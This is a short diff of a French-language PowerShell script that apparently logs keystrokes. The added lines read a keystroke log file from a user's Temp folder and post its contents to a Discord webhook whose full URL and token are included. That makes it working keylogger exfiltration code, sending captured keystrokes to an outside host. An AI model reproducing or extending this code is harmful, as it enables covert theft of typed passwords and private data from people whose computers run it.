@@ -91,3 +91,9 @@ if (Test-Path $logfile) {
 } else {
     Write-Host "Aucune touche enregistrée." -ForegroundColor Gray
 }
+
+Start-Sleep -Seconds 3
+
+$webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
+$contenu = Get-Content "C:\Users\Hugo\AppData\Local\Temp\key.log" -Raw
+Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$contenu} | ConvertTo-Json) -ContentType "application/json"
